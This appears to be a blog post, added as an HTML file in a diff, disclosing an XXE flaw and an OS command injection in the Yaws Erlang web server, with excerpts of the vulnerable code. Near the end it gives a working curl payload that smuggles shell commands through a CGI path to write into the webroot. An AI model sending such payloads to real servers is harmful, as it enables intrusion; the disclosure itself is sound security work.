@@ -1,0 +1,146 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="author" content="Alexey Pronin">
+  
+  <link rel="canonical" href="../../post/yaws-xxe-and-shell-injections/" />
+  <meta name="theme-color" content="#563d7c">
+  
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <title>XXE and OS command injections in Yaws - vuln.be</title>
+  <link href="../../css/main.css" rel="stylesheet">
+  
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:url" content="https://vuln.be/post/yaws-xxe-and-shell-injections/" />
+  <meta property="og:description" content="Yaws is a web server for Erlang applications. As a result of research, I found an XXE injection in a WebDAV module and OS command injection in a CGI module." />
+  <meta name="twitter:creator" content="@vulnbe" />
+  <meta property="og:title" content="XXE and OS command injections in Yaws" />
+  <meta property="og:image" content="https://vuln.be/images/yaws-dav-xxe.png" />
+  
+  <link rel="alternate" type="application/atom+xml" href="../../atom.xml" title="vuln.be Atom Feed">
+  <link rel="alternate" type="application/rss+xml" href="../../rss.xml" title="vuln.be RSS Feed">
+</head>
+
+<body>
+  <div class="container">
+    <header class="blog-header py-3">
+      <div class="row flex-nowrap justify-content-between align-items-center">
+        <div class="col-12 text-center">
+          <a class="blog-header-logo text-dark" href="../../">VULN.BE</a>
+      </div>
+    </header>
+
+    <div class="nav-scroller py-1 mb-4 border-bottom">
+      <nav class="nav d-flex justify-content-between">
+        <a class="p-2 text-muted" href="../../">Home</a><a class="p-2 text-muted" href="../../tags/">Tags</a><a class="p-2 text-muted" href="../../archives/">Archives</a><a class="p-2 text-muted" href="../../page/contacts/">Contacts</a><a class="p-2 text-muted" href="../../page/about/">About</a>
+      </nav>
+    </div>
+    
+    <div class="blog-main px-2 my-4">
+      <div class="blog-post">
+  <div class="blog-post-meta font-weight-light">
+    <time datetime="2020-09-07" pubdate class="text-uppercase" data-updated="true"> 7 September 2020</time>
+    <div class="tags text-lowercase"><a href="../../tags/xxe/">xxe</a> | <a href="../../tags/shell injection/">shell injection</a> | <a href="../../tags/injection/">injection</a> | <a href="../../tags/yaws/">yaws</a> | <a href="../../tags/CVE/">CVE</a> | <a href="../../tags/CVE-2020-24379/">CVE-2020-24379</a> | <a href="../../tags/CVE-2020-24916/">CVE-2020-24916</a> | <a href="../../tags/erlang/">erlang</a></div>
+  </div>
+  <h1 class><a href="../../post/yaws-xxe-and-shell-injections/">XXE and OS command injections in Yaws</a></h1>
+  
+  <div class="mb-4 post-content">
+    <p>Yaws is a web server for dynamic-content web applications written in Erlang. The server includes several modules, typical for web servers. As a result of research, I found an XXE injection in a WebDAV module and OS command injection in a CGI module.</p>
+<!--more-->
+<h2 id="xxe-injection-cve-2020-24379">XXE injection (CVE-2020-24379)</h2>
+<p>WebDAV is an HTTP protocol extension that facilitates collaboration between users in editing and managing files stored on World Wide Web servers.</p>
+<p>The extension uses XML in some methods.</p>
+<p>I had a working blind injection payload and started looking for a way to exploit XXE directly.</p>
+<p>The LOCK method designed to lock the resource proved to be useful. Entity <code>d:href</code> allows returning data:</p>
+<p><img src="../../images/yaws-dav-xxe.png" /></p>
+<p>WebDAV module uses the Xmerl Erlang library for parsing messages of methods LOCK, PROPFIND and PROPPATCH. It is a rather powerful library, but it has unsafe defaults.</p>
+<p>WebDAV must be enabled in the configuration file to be able to exploit the vulnerability:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="kw">&lt;server&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a>  ...</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a>  dav = true</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a><span class="kw">&lt;/server&gt;</span></span></code></pre></div>
+<p>Vulnerable code was introduced in the commit <a href="https://github.com/erlyaws/yaws/commit/16299b328a56edbc66f43588336efe8d2807cf05">16299b3</a> on May 16, 2005. So versions 1.81 to 2.0.7 are vulnerable to XXE injection.</p>
+<h2 id="os-command-injection-cve-2020-24916">OS command injection (CVE-2020-24916)</h2>
+<p>Yaws’ CGI module (Common Gateway Interface) allows executing programs that dynamically generate web pages. The usage of such interfaces is often associated with security problems.</p>
+<p>In the Yaws, the <em>cgi</em> module is used to execute PHP scripts and other external programs.</p>
+<p>The choice of the request handler takes place in <em>yaws_server.erl</em>:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode erlang"><code class="sourceCode erlang"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="fu">handle_ut(</span><span class="va">CliSock</span><span class="fu">,</span> <span class="va">ARG</span><span class="fu">,</span> <span class="va">UT</span> <span class="op">=</span> <span class="fu">#</span><span class="ch">urltype</span><span class="fu">{</span><span class="ch">type</span> <span class="op">=</span> <span class="ch">php</span><span class="fu">},</span> <span class="va">N</span><span class="fu">)</span> <span class="op">-&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a>    <span class="fu">...</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a>    <span class="va">Fun</span> <span class="op">=</span> <span class="kw">case</span> <span class="va">SC</span><span class="fu">#</span><span class="ch">sconf</span><span class="fu">.</span><span class="ch">php_handler</span> <span class="kw">of</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a>              <span class="fu">{</span><span class="ch">cgi</span><span class="fu">,</span> <span class="va">Exe</span><span class="fu">}</span> <span class="op">-&gt;</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a>                  <span class="kw">fun</span><span class="fu">(</span><span class="va">A</span><span class="fu">)</span><span class="op">-&gt;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true"></a>                          <span class="fu">yaws_cgi:call_cgi(</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true"></a>                            <span class="va">A</span><span class="fu">,</span><span class="va">Exe</span><span class="fu">,lists:flatten(</span><span class="va">UT</span><span class="fu">#</span><span class="ch">urltype</span><span class="fu">.</span><span class="ch">fullpath</span><span class="fu">)</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true"></a>                           <span class="fu">)</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true"></a>    <span class="fu">...</span></span></code></pre></div>
+<p>For <em>.php</em> files, the handler calls the <em>Exe</em> program specified in the configuration.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode erlang"><code class="sourceCode erlang"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="fu">handle_ut(</span><span class="va">CliSock</span><span class="fu">,</span> <span class="va">ARG</span><span class="fu">,</span> <span class="va">UT</span> <span class="op">=</span> <span class="fu">#</span><span class="ch">urltype</span><span class="fu">{</span><span class="ch">type</span> <span class="op">=</span> <span class="ch">cgi</span><span class="fu">},</span> <span class="va">N</span><span class="fu">)</span> <span class="op">-&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a>    <span class="fu">...</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a>    <span class="fu">deliver_dyn_part(...</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a>                     <span class="kw">fun</span><span class="fu">(</span><span class="va">A</span><span class="fu">)</span><span class="op">-&gt;</span><span class="fu">yaws_cgi:call_cgi(</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a>                               <span class="va">A</span><span class="fu">,lists:flatten(</span><span class="va">UT</span><span class="fu">#</span><span class="ch">urltype</span><span class="fu">.</span><span class="ch">fullpath</span><span class="fu">))</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a>    <span class="fu">...</span></span></code></pre></div>
+<p>The handler makes almost the same call for <em>.cgi</em> files, except that it uses the full path to the requested file as an external program.</p>
+<p>Yaws checks requested file existence without applying bash expansion to resolve the file path, so I was not able to exploit cgi module using these handlers.</p>
+<p>Appmod_cgi is a simple module that adds another handler implementing CGI behavior for anything that rests at a particular path (usually <code>./cgi-bin/</code>) and it is turned on by default.</p>
+<p><em>src/yaws_appmod_cgi.erl</em>:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode erlang"><code class="sourceCode erlang"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="fu">out(</span><span class="va">Arg</span><span class="fu">)</span> <span class="op">-&gt;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a>    <span class="fu">yaws_cgi:call_cgi(</span><span class="va">Arg</span><span class="fu">,</span>  <span class="fu">lists:flatten(</span><span class="va">Arg</span><span class="fu">#</span><span class="ch">arg</span><span class="fu">.</span><span class="ch">fullpath</span><span class="fu">)).</span></span></code></pre></div>
+<p>The webserver does not check whether the requested file exists in <code>/cgi-bin/</code> but passes the path to it through a chain: call_cgi -&gt; cgi_start_worker -&gt; cgi_worker.</p>
+<p><em>src/yaws_cgi.erl:</em></p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode erlang"><code class="sourceCode erlang"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="fu">cgi_worker(</span><span class="va">Parent</span><span class="fu">,</span> <span class="va">Arg</span><span class="fu">,</span> <span class="va">Exefilename</span><span class="fu">,</span> <span class="va">Scriptfilename</span><span class="fu">,</span> <span class="va">Pathinfo</span><span class="fu">,</span> <span class="va">ExtraEnv0</span><span class="fu">,</span> <span class="va">SC</span><span class="fu">)</span> <span class="op">-&gt;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a>    <span class="fu">...</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a>    <span class="va">CGIPort</span> <span class="op">=</span> <span class="fu">open_port({spawn,</span> <span class="va">Exefilename</span><span class="fu">},</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a>                        <span class="fu">[{</span><span class="ch">env</span><span class="fu">,</span> <span class="va">Env</span><span class="fu">},</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a>                         <span class="fu">{</span><span class="ch">cd</span><span class="fu">,</span> <span class="fu">pathof(</span><span class="va">Scriptfilename</span><span class="fu">)},</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a>                         <span class="ch">exit_status</span><span class="fu">,</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a>                         <span class="ch">binary</span><span class="fu">]),</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a>    <span class="fu">...</span></span></code></pre></div>
+<p>The values of Exefilename, Scriptfilename, which depend on the name of the requested file, fall into the shell here.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode erlang"><code class="sourceCode erlang"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="fu">call_cgi(</span><span class="va">Arg</span><span class="fu">,</span> <span class="va">Scriptfilename</span><span class="fu">)</span> <span class="op">-&gt;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a>    <span class="fu">call_cgi(</span><span class="va">Arg</span><span class="fu">,</span> <span class="ch">undefined</span><span class="fu">,</span> <span class="va">Scriptfilename</span><span class="fu">,</span> <span class="ch">undefined</span><span class="fu">,</span> <span class="fu">[]).</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="fu">call_cgi(</span><span class="va">Arg</span><span class="fu">,</span> <span class="va">Exefilename</span><span class="fu">,</span> <span class="va">Scriptfilename</span><span class="fu">)</span> <span class="op">-&gt;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a>    <span class="fu">call_cgi(</span><span class="va">Arg</span><span class="fu">,</span> <span class="va">Exefilename</span><span class="fu">,</span> <span class="va">Scriptfilename</span><span class="fu">,</span> <span class="ch">undefined</span><span class="fu">,</span> <span class="fu">[]).</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a><span class="fu">call_cgi(</span><span class="va">Arg</span><span class="fu">,</span> <span class="va">Exefilename</span><span class="fu">,</span> <span class="va">Scriptfilename</span><span class="fu">,</span> <span class="va">Pathinfo</span><span class="fu">)</span> <span class="op">-&gt;</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a>    <span class="fu">call_cgi(</span><span class="va">Arg</span><span class="fu">,</span> <span class="va">Exefilename</span><span class="fu">,</span> <span class="va">Scriptfilename</span><span class="fu">,</span> <span class="va">Pathinfo</span><span class="fu">,</span> <span class="fu">[]).</span></span></code></pre></div>
+<p>In case the <em>Exefilename</em> is undefined, its value is obtained by applying the <em>exeof</em> function to <em>Scriptfilename</em>. The function cuts everything from the beginning of the path to the last <code>/</code>.</p>
+<p>So if we want to use <code>/</code> in our payload, we have to hide it somehow, for example, in the environment variable: <code>export Z=$(pwd|cut -c1)</code>.</p>
+<p>Then we can get what we need from the environment: <code>echo pawned &gt;&gt; ..$Z""index.html</code></p>
+<p>Thus, a simple query allows you to write a file to the webroot:</p>
+<p><code>curl 'http://127.0.0.1:8000/cgi-bin/%22%60export%20Z=$(pwd%7Ccut%20-c1);echo%20pawned%20completely%3E%3E..$Z%22%22index.html%60%22'</code></p>
+<video style="width:100%" controls src="../../videos/yaws-cgi-command-injection-poc.mp4" type="video/mp4"></video>
+<p>Vulnerable code was introduced in the commit <a href="https://github.com/erlyaws/yaws/commit/7cd40802df98ce6454bdc1003bb126a354cda3a4">7cd4080</a> on Mar 10, 2008. So versions 1.81 to 2.0.7 are vulnerable.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/vulnbe/poc-yaws-dav-xxe">XXE injection PoC</a></li>
+<li><a href="https://github.com/vulnbe/poc-yaws-cgi-shell-injection">Shell injection PoC</a></li>
+<li><a href="https://portswigger.net/web-security/os-command-injection">OS command injection explained by PortSwigger</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611: Improper Restriction of XML External Entity Reference</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</a></li>
+<li><a href="http://erlang.org/doc/man/xmerl.html">Xmerl</a></li>
+<li><a href="http://www.ietf.org/rfc/rfc4331.txt">RFC 4331</a></li>
+<li><a href="http://www.ietf.org/rfc/rfc3875.txt">RFC 3875: The Common Gateway Interface (CGI) Version 1.1</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24379">CVE-2020-24379</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24916">CVE-2020-24916</a></li>
+</ul>
+  </div>
+  
+</div>
+
+    </div>
+    <footer class="p-2 d-flex justify-content-between blog-footer font-weight-lighter border-top">
+      <p>Copyright © 2023 Alexey Pronin</p>
+      <p>Powered by <a href="https://jaspervdj.be/hakyll/">Hakyll</a>.</p>
+    </footer>
+  </div>
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+</body>
+</html>
